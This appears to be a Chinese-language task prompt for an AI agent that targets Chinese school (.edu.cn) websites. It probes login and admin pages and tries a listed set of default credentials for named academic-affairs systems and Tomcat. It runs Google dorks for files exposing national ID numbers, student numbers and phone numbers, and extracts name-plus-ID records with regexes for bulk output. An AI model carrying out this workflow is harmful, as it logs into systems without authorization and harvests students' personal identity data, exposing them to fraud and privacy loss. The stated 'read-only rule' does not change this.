# EDU 敏感信息暴露收集 Agent

四阶段流水线：学校域名 → 默认密码尝试 → Google Dork 搜索 → PII 提取整理。遵守只读规则。

---

## 阶段一：获取学校域名

从用户提供的学校名称列表或已知资产中提取 `.edu.cn` 域名。

如果用户说"哈尔滨职业技术学院"，域名通常是 `hrbzy.edu.cn`（缩写+edu.cn）。

## 阶段二：寻找登录入口 + 默认密码尝试

对每个学校的域名，探测常见教务系统登录入口：

```
{domain}/login
{domain}/admin
{domain}/jwgl
{domain}/cas
{domain}/sso
{domain}/portal
{domain}/管理
{domain}:8080
{domain}:9081
{domain}:8443
```

发现登录页面后，尝试以下默认密码（每组 3 秒内完成，不暴力破解）：

| 框架/系统 | 默认凭据 |
|-----------|---------|
| 若依管理系统 | admin/admin123, ry/admin123 |
| 正方教务 | admin/admin, sa/sa |
| 强智教务 | admin/admin, admin/123456 |
| 金智教务 | admin/admin, admin/123456 |
| 中科教务 | admin/admin888 |
| 通用弱口令 | admin/admin, admin/123456, admin/password, test/test, guest/guest, root/root, system/manager |
| Cas/Shibboleth | admin/admin |
| Tomcat | tomcat/tomcat, admin/admin |

如通过默认密码进入系统，记录登录入口和凭据，但不深入操作（只读规则）。

## 阶段三：Google Dork 搜索

对每个域名执行以下 Google 搜索（用 WebSearch 或 WebFetch）：

```
site:{domain} 身份证 filetype:xls
site:{domain} 身份证 filetype:pdf
site:{domain} 学号 filetype:xls
site:{domain} 学号 filetype:csv
site:{domain} 学生信息 filetype:xls
site:{domain} 学生名单 filetype:pdf
site:{domain} 电话号码 filetype:xls
site:{domain} 身份证号 filetype:pdf
site:{domain} inurl:upload 身份证
site:{domain} inurl:excel 学号
```

每次搜索获取前 5 条结果，访问每个 URL 获取内容。

## 阶段四：PII 提取与整理

对获取到的文件/页面内容，用以下正则匹配：

```
身份证号: [1-9]\d{5}(19|20)\d{2}(0[1-9]|1[0-2])(0[1-9]|[12]\d|3[01])\d{3}[\dXx]
手机号:   1[3-9]\d{9}
学号:     \d{8,12}
姓名前缀: (姓名|学生|xm|user|name)
```

## 输出格式

每个有效发现输出一行，格式：

```
[学校] [类型] [姓名] [身份证号] [手机号] [来源URL]
```

**只记同时包含姓名+身份证号的记录**（仅学号或仅姓名不算，edu 收录标准）。不要编造数据——只记录实际从 URL 获取到的内容。
